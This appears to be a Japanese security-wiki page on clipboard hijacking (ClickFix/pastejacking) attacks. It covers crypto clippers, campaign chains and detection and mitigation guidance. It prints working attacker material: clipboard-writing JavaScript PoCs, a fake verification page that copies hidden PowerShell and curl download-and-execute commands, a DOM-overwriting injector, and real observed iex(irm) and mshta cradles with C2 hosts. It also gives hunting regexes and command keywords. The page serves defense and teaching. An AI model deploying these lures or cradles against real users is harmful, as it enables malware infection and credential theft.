# Clipboard Hijacking (Pastejacking) 攻撃

{{#include ../../banners/hacktricks-training.md}}

> 「自分でコピーしていないものは、決して貼り付けないこと。」— 昔からあるが、今も有効な助言

## 概要

Clipboard hijacking（pastejacking）は、ユーザーが内容を確認せずにコマンドをコピー＆ペーストする習慣を悪用します。悪意あるWebページ（またはElectronやDesktopアプリケーションなど、JavaScriptを実行できるコンテキスト）は、攻撃者が制御するテキストをシステムのクリップボードにプログラムで書き込みます。被害者は、巧妙に作られたソーシャルエンジニアリングの指示に従って、**Win + R**（「ファイル名を指定して実行」ダイアログ）、**Win + X**（クイックアクセス／PowerShell）を押すか、ターミナルを開いてクリップボードの内容を*貼り付ける*よう誘導され、任意のコマンドが即座に実行されます。

**ファイルのダウンロードも添付ファイルのオープンも行われない**ため、この手法は添付ファイル、マクロ、直接のコマンド実行を監視するメールやWebコンテンツのセキュリティ制御の大半を回避します。そのため、NetSupport RAT、Latrodectus loader、Lumma Stealerなどの一般的なマルウェアを配布するフィッシングキャンペーンでよく使われます。<sup>[[1]](#references)</sup>

## ウォレットアドレス置換型 clipper

Clipboard hijackingの別の亜種は、コマンドを貼り付けさせるのではなく、被害者が**暗号資産ウォレットのアドレス**をコピーするのを待ち、貼り付ける直前に攻撃者が管理するアドレスへひそかに置き換えます。長い形式のウォレットアドレスでは、ユーザーが先頭と末尾の文字だけを確認することが多いため、特に効果的です。<sup>[[8]](#references)</sup>

実環境でよく見られる特徴:
- **軽量なloader + 入れ子になったpayload**: 表向きのアプリ／exeは正規の取引ツールや「利益獲得」ツールに見えますが、本物のclipperはバンドルのより深い階層に隠されています（たとえば、.NET loaderが入れ子になったRust payloadを起動する）。
- **Regexによる置換**: マルウェアは`bc1...`、`1...`、`3...`、`0x...`、`addr1...`、`DdzFF...`、`ltc...`、`T...`、`r...`、さらには一般的な**44文字のSolana風**文字列などを照合し、攻撃者のウォレットアドレスに書き換えます。
- **大規模なウォレットローテーション**: 最近のWindowsサンプルは、盗難のたびにウォレットの評判が損なわれるのを抑えるため、単一の固定アドレスではなく、通貨ごとに**数千件**の置換用ウォレットを埋め込んでいる場合があります。<sup>[[8]](#references)</sup>

### Windows clipperの処理フロー

一般的な実装では、**`AddClipboardFormatListener`**で登録した非表示ウィンドウを使います。クリップボードが更新されるたびに、マルウェアは通常、次のAPIを呼び出します。<sup>[[8]](#references)</sup>
- **`OpenClipboard`** → 現在のクリップボードデータにアクセスする。
- **`GetClipboardData`** → テキストを読み取る。
- **`EmptyClipboard`** + **`SetClipboardData`** → ウォレット文字列を攻撃者の値に置き換える。

clipperでよく見られる最小限のハンティング用regex:

```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```

ユーザーレベルの永続化で十分な影響を与えられます。観測されたパターンの一つは次のとおりです。<sup>[[8]](#references)</sup>
- ペイロードを **`%APPDATA%\silke\silke.exe`** にコピーする
- `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\` の下に **Startup-folder LNK** を作成する

検知のヒント:
- Clipboard APIを継続的に呼び出しながら、`%APPDATA%` とユーザーの **Startup** フォルダーにも書き込むプロセス。
- 新しいLNKや実行ファイルの作成後に、ウォレットアドレスをクリップボードへ繰り返し書き込む動作。
- 未使用ファイルを多数含み、入れ子になったバイナリを起動する小さなランチャーを含むアーカイブや偽ソフトウェアのバンドル。

### macOSでソーシャルエンジニアリングを使ってquarantineを削除し、LaunchAgentで永続化する手法

macOSでは、一部のキャンペーンで **`unlocker.command`** ヘルパーを配布し、Gatekeeperがアプリについて「破損している」または「未確認の開発元によるもの」と警告した場合、被害者に右クリックして **「開く」** を選ぶよう指示します。このスクリプトはquarantineを削除して、近くにある `.app` を起動するだけです。<sup>[[8]](#references)</sup>

```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```

これは Gatekeeper exploit ではありません。Gatekeeper の判定が `com.apple.quarantine` xattr に依存することを悪用した、**ソーシャルエンジニアリングによる quarantine bypass** です。<sup>[[8]](#references)</sup>

実行後、clipper は次のファイルを書き込むことで、現在のユーザーとして永続化できます。<sup>[[8]](#references)</sup>
- **`~/launch.sh`** – wrapper script
- **`~/Library/LaunchAgents/com.example..plist`** – `RunAtLoad` と `KeepAlive` を設定した LaunchAgent

防御上の重要な点として、一部のサンプルには、約30秒ごとに LaunchAgent と wrapper を再作成する **自己修復型 watchdog** が実装されています。実行中のプロセスを終了せずに plist を先に削除すると、マルウェアがすぐに再作成する可能性があります。<sup>[[8]](#references)</sup> 安全な削除手順:
1. 実行中の clipper プロセスを終了する。
2. LaunchAgent plist をアンロードして削除する。
3. `~/launch.sh` とコピーされた payload を削除する。

### 配布に関する注意: 信頼性を高める偽の評判

このファミリーでは、マルウェア自体は技術的に単純なままでも、**配布レイヤー**が大きな役割を果たします。偽の GitHub stars/forks、SourceForge のレビューやダウンロード、YouTube チュートリアルのコメントや再生回数、VirusTotal の無害そうなコメントや投票を利用し、実行前にバイナリを信頼できるように見せかけます。<sup>[[8]](#references)</sup>

## 強制コピーボタンと隠された payload（macOS one-liners）

一部の macOS infostealer は、インストーラーサイト（例: Homebrew）を複製し、ユーザーが表示されているテキストだけを選択できないように **「Copy」ボタンの使用を強制**します。クリップボードの内容には、想定されるインストールコマンドに加えて Base64 payload が追記されています（例: `...; echo <b64> | base64 -d | sh`）。そのため、UI に隠された追加の処理も含め、1回貼り付けるだけで両方が実行されます。<sup>[[5]](#references)</sup>

## JavaScript Proof-of-Concept

```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
  const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
  navigator.clipboard.writeText(payload)
    .then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```

以前のキャンペーンでは `document.execCommand('copy')` が使われていましたが、最近のキャンペーンでは非同期の **Clipboard API** (`navigator.clipboard.writeText`) が使われています。<sup>[[2]](#references)</sup>

## ClickFix / ClearFake のフロー

1. ユーザーがタイポスクワッティングされたサイト、または侵害されたサイト（例: `docusign.sa[.]com`）にアクセスする
2. 注入された **ClearFake** JavaScript が `unsecuredCopyToClipboard()` ヘルパーを呼び出し、Base64エンコードされた PowerShell のワンライナーを密かにクリップボードに保存する。
3. HTMLの指示で被害者に次のように促す: *「**Win + R** を押し、コマンドを貼り付けて Enter キーを押すと問題が解決します。」*
4. `powershell.exe` が実行され、正規の実行ファイルと悪意のある DLL を含むアーカイブをダウンロードする（典型的な DLL sideloading）。
5. ローダーが追加のステージを復号し、シェルコードをインジェクトして永続化をインストールする（例: スケジュールされたタスク）。最終的に NetSupport RAT / Latrodectus / Lumma Stealer を実行する。<sup>[[1]](#references)</sup>

### NetSupport RAT のチェーン例

```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```

* `jp2launcher.exe`（正規の Java WebStart）は、同じディレクトリ内で `msvcp140.dll` を検索します。
* 悪意のある DLL は **GetProcAddress** で API を動的に解決し、**curl.exe** 経由で 2 つのバイナリ（`data_3.bin`、`data_4.bin`）をダウンロードします。ローリング XOR キー `"https://google.com/"` を使って復号し、最終的な shellcode をインジェクトして、**client32.exe**（NetSupport RAT）を `C:\ProgramData\SecurityCheck_v1\` に展開します。<sup>[[1]](#references)</sup>

### Latrodectus Loader

```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```

1. **curl.exe** を使って `la.txt` をダウンロード
2. **cscript.exe** 内で JScript downloader を実行
3. MSI payload を取得 → 署名済みアプリケーションの隣に `libcef.dll` を配置 → DLL sideloading → shellcode → Latrodectus.<sup>[[1]](#references)</sup>

### MSHTA 経由の Lumma Stealer

```
mshta https://iplogger.co/xxxx =+\\xxx
```

**mshta** の呼び出しにより、非表示の PowerShell スクリプトが起動し、`PartyContinued.exe` を取得します。次に `Boat.pst` (CAB) を展開し、`extrac32` とファイルの連結によって `AutoIt3.exe` を再構成します。最後に、ブラウザーの認証情報を `sumeriavgv.digital` に外 exfiltrate する `.a3x` スクリプトを実行します。<sup>[[1]](#references)</sup>

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK（C2 がローテーションする PureHVNC）

一部の ClickFix キャンペーンでは、ファイルのダウンロードを完全に省略し、被害者に、WSH 経由で JavaScript を取得して実行し、それを永続化して、C2 を毎日ローテーションするワンライナーを貼り付けるよう指示します。観測された攻撃チェーンの例：<sup>[[3]](#references)</sup>

```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new 
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```

主な特徴
- 難読化されたURLを実行時に逆順にし、簡単な調査での発見を回避する。
- JavaScriptはStartup LNK（WScript/CScript）を介して自身を永続化し、当日の日付に基づいてC2を選択することで、ドメインを迅速にローテーションできる。<sup>[[3]](#references)</sup>

日付に基づいてC2をローテーションするための最小限のJSコード断片：<sup>[[3]](#references)</sup>
```js
function getURL() {
    var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
    var current_datetime = new Date().getTime();
    var no_days = getDaysDiff(0, current_datetime);
    return 'https://'
        + getListElement(C2_domain_list, no_days)
        + '/Y/?t=' + current_datetime
        + '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```

次の段階では、通常、persistenceを確立してRAT（例: PureHVNC）を取得するloaderを展開します。多くの場合、ハードコードされた証明書にTLSをpinningし、通信をチャンク化します。<sup>[[3]](#references)</sup>

この亜種に特有の検知方法
- プロセスツリー: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js`（または`cscript.exe`）。
- Startupの痕跡: `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`にあるLNKが、`%TEMP%`または`%APPDATA%`配下のJSパスを指定してWScript/CScriptを起動する。
- `.split('').reverse().join('')`または`eval(a.responseText)`を含むRegistry/RunMRUおよびコマンドラインのテレメトリ。
- 長いコマンドラインを使わずに長いスクリプトを渡すため、大きなstdinペイロードを伴う`powershell -NoProfile -NonInteractive -Command -`の繰り返し実行。
- その後、`regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"`などのLOLBinsを実行するScheduled Tasks。updater風のタスク名/パス（例: `\GoogleSystem\GoogleUpdater`）を使用。

脅威ハンティング
- 日替わりでローテーションするC2のホスト名と、`.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`形式のURL。
- clipboardへの書き込みイベントの後にWin+Rで貼り付け、その直後に`powershell.exe`が実行される流れを相関分析する。

Blue teamはclipboard、プロセス作成、Registryのテレメトリを組み合わせて、pastejackingの悪用を特定できます。

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU`には**Win + R**コマンドの履歴が保存されます。不審なBase64や難読化されたエントリを探します。
* Security Event ID **4688**（Process Creation）で、`ParentImage` == `explorer.exe`かつ`NewProcessName`が{ `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }のイベント。
* 不審な4688イベントの直前に、`%LocalAppData%\Microsoft\Windows\WinX\`または一時フォルダー内でファイルが作成されたことを示すEvent ID **4663**。
* EDRのclipboardセンサー（利用可能な場合）で、`Clipboard Write`の直後に新しいPowerShellプロセスが起動する流れを相関分析します。

## IUAM風の検証ページ（ClickFix Generator）: clipboardからコンソールへのコピー + OS対応ペイロード

最近のキャンペーンでは、偽のCDN/ブラウザー検証ページ（「Just a moment…」、IUAM風）が大量に作成されています。これらは、ユーザーにclipboardからOS固有のコマンドをコピーさせ、ネイティブコンソールに貼り付けさせます。これにより実行場所がブラウザーのsandbox外に移り、WindowsとmacOSの両方で動作します。<sup>[[4]](#references)</sup>

builderが生成するページの主な特徴
- `navigator.userAgent`でOSを検出し、ペイロードを調整（Windows PowerShell/CMDまたはmacOS Terminal）。未対応OS向けに、見せかけ用のdecoy/no-opを任意で表示し、偽装を維持します。
- 無害なUI操作（checkbox/Copy）でclipboardへ自動コピーします。画面に表示されるテキストとclipboardの内容が異なる場合があります。
- モバイルをブロックし、手順を示すpopoverを表示します: Windows → Win+R→貼り付け→Enter; macOS → Terminalを開く→貼り付け→Enter。
- 任意の難読化機能と、侵害されたサイトのDOMをTailwindスタイルの検証UIで上書きする単一ファイルのinjector（新しいドメイン登録は不要）。<sup>[[4]](#references)</sup>

例: clipboardの内容との不一致 + OSに応じた分岐
```html
<div class="space-y-2">
  <label class="inline-flex items-center space-x-2">
    <input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
  </label>
  <div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
  // UI shows a harmless string, but clipboard gets the real command
  navigator.clipboard.writeText(real).then(()=>{
    document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
  });
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```

初回実行の macOS persistence
- `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` を使うと、ターミナルを閉じた後も実行が継続し、目に見える痕跡を減らせます。<sup>[[4]](#references)</sup>

侵害されたサイト上でのページの乗っ取り
```html
<script>
(async () => {
  const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
  document.documentElement.innerHTML = html;                 // overwrite DOM
  const s = document.createElement('script');
  s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
  document.head.appendChild(s);
})();
</script>
```

IUAM形式の誘導に特化した検知・ハンティングのアイデア
- Web: 検証ウィジェットにClipboard APIを結び付けるページ、表示テキストとクリップボードのペイロードの不一致、不審な状況での`navigator.userAgent`による分岐、Tailwindと単一ページの置き換えの組み合わせ。
- Windowsエンドポイント: ブラウザー操作の直後に発生する`explorer.exe` → `powershell.exe`/`cmd.exe`のプロセス生成、`%TEMP%`から実行されるバッチ/MSIインストーラー。
- macOSエンドポイント: ブラウザーイベントの前後に、Terminal/iTermが`bash`/`curl`/`base64 -d`を起動し、`nohup`を使う動作。ターミナルを閉じた後もバックグラウンドジョブが存続する動作。
- `RunMRU`のWin+R履歴とクリップボードへの書き込みを、その後のコンソールプロセス生成と関連付ける。

関連する手法

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026年の偽CAPTCHA / ClickFixの進化（ClearFake、Scarlet Goldfinch）

- ClearFakeは引き続きWordPressサイトを侵害し、外部ホスト（Cloudflare Workers、GitHub/jsDelivr）や、ブロックチェーンの「etherhiding」呼び出し（例: `bsc-testnet.drpc[.]org`などのBinance Smart Chain APIエンドポイントへのPOST）を連鎖させるローダーJavaScriptを挿入し、最新の誘導ロジックを取得しています。最近のオーバーレイでは、何かをダウンロードさせるのではなく、ユーザーに1行のコマンドをコピー＆ペーストさせる偽CAPTCHA（T1204.004）が多用されています。<sup>[[6]](#references)</sup>
- 初期実行は、署名済みスクリプトホスト/LOLBASに委ねられるケースが増えています。2026年1月の攻撃チェーンでは、従来の`mshta`の使用に代わり、組み込みの`SyncAppvPublishingServer.vbs`を`WScript.exe`経由で実行し、PowerShell風の引数にエイリアスやワイルドカードを含めてリモートコンテンツを取得していました。<sup>[[6]](#references)</sup>

```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```

  - `SyncAppvPublishingServer.vbs` は署名済みで、通常は App-V で使用されます。`WScript.exe` と通常とは異なる引数（`gal`/`gcm` エイリアス、ワイルドカードを使った cmdlet、jsDelivr URL）と組み合わせると、ClearFake の高シグナルな LOLBAS stage になります。<sup>[[6]](#references)</sup>
- 2026年2月、偽 CAPTCHA の payload は純粋な PowerShell の download cradle に回帰しました。実際に確認された例を2つ示します。<sup>[[6]](#references)</sup>

```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```

  - 1つ目のチェーンは、メモリ内で実行する `iex(irm ...)` grabberです。2つ目は `WinHttp.WinHttpRequest.5.1` 経由でステージングし、一時 `.ps1` ファイルを書き込んだ後、非表示ウィンドウで `-ep bypass` を指定して起動します。<sup>[[6]](#references)</sup>

これらの亜種の検出・ハンティングのヒント
- プロセス系譜: ブラウザー → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` または、クリップボードへの書き込み／Win+R の直後に実行される PowerShell cradle。
- コマンドラインのキーワード: `SyncAppvPublishingServer.vbs`、`WinHttp.WinHttpRequest.5.1`、`-UseBasicParsing`、`%TEMP%\FVL.ps1`、jsDelivr/GitHub/Cloudflare Worker のドメイン、または生の IP を使う `iex(irm ...)` パターン。
- ネットワーク: Web 閲覧の直後に、スクリプトホストや PowerShell から CDN worker ホストまたは blockchain RPC エンドポイントへのアウトバウンド通信。
- ファイル／レジストリ: `%TEMP%` 配下への一時 `.ps1` の作成、およびこれらのワンライナーを含む RunMRU エントリ。外部 URL や難読化されたエイリアス文字列を使って実行される、署名済みスクリプトの LOLBAS（WScript/cscript/mshta）をブロック／アラート対象にする。

## 2026年6月のClickFix tradecraft: ペーストのテレメトリ、偽の検証コメント、LOLBinチェーン

Red Canary の最近のテレメトリによると、安定した指標は**特定のコマンドそのものではなく**、**ユーザー操作による貼り付けと実行**、**信頼されたインタープリター／LOLBins**、**難読化されたフラグ**、**リモート取得**、および**即時実行**の組み合わせです。<sup>[[7]](#references)</sup>

### 注目すべきオペレーターのパターン

- **貼り付け確認テレメトリ**: 一部のペイロードは、実際のステージを実行する前に `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` を呼び出します。これにより、ウィンドウを短時間かつ目立たない状態に保ちながら、ユーザーの操作を確認します。
- **偽の検証コメント**: PowerShell のワンライナーは、`# Security check ✔️ I'm not a robot Verification ID: 138105` などの文字列を末尾に追加することがあります。これにより、Run / `cmd.exe` / PowerShell の履歴に貼り付けられた後も、コマンドが CAPTCHA 関連のものに見えるようにします。
- **動的な URL の再構成**: `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` は、コマンドライン上に固定 URL を表示せずに、メモリ内でのダウンロードと実行を行います。
- **インストーラーを装った実行**: `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` は、通常とは異なる大文字小文字や Unicode 風の文字をフラグに使い、脆弱な検出を回避しながら `msiexec.exe` に見せかけます。
- **キャレットでエスケープした LOLBin チェーン**: `cmd.exe` は `^` エスケープ（`s^t^a^r^t`、`^c^u^r^l^`、`^m^s^h^t^a^`）でキーワードを隠し、ネストしたシェルを最小化状態で起動し、攻撃者のコンテンツを `.pdf` などの無害な拡張子で保存した後、`mshta` 経由で実行できます。<sup>[[7]](#references)</sup>
## 緩和策

1. ブラウザーの強化 – クリップボードへの書き込み権限（`dom.events.asyncClipboard.clipboardItem` など）を無効にするか、ユーザー操作を必須にする。
2. セキュリティ意識の向上 – 機密性の高いコマンドは *入力する* か、まずテキストエディターに貼り付けるようユーザーに教える。
3. PowerShell Constrained Language Mode / Execution Policy と Application Control を使い、任意のワンライナーをブロックする。
4. ネットワーク制御 – 既知の pastejacking およびマルウェア C2 ドメインへのアウトバウンドリクエストをブロックする。

## 関連するテクニック

* **Discord Invite Hijacking** は、ユーザーを悪意のあるサーバーに誘い込んだ後、同じ ClickFix 手法を悪用することがよくあります:
  
{{#ref}}
  discord-invite-hijacking.md
  {{#endref}}

## References

- [1] [クリックを修正する: ClickFix攻撃ベクトルの防止](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [2] [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [3] [Check Point Research – 純粋なカーテンの向こう側: RATからBuilder、Coderへ](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [4] [ClickFix Factory: IUAM ClickFix Generatorの初公開](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [5] [2025年、Infostealerの年](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [6] [Red Canary – Intelligence Insights: 2026年2月](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [7] [Red Canary – Intelligence Insights: 2026年6月](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [8] [Check Point Research – 星から高評価へ: 偽の評判を利用するCrypto Clipboard Hijacker](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)
{{#include ../../banners/hacktricks-training.md}}
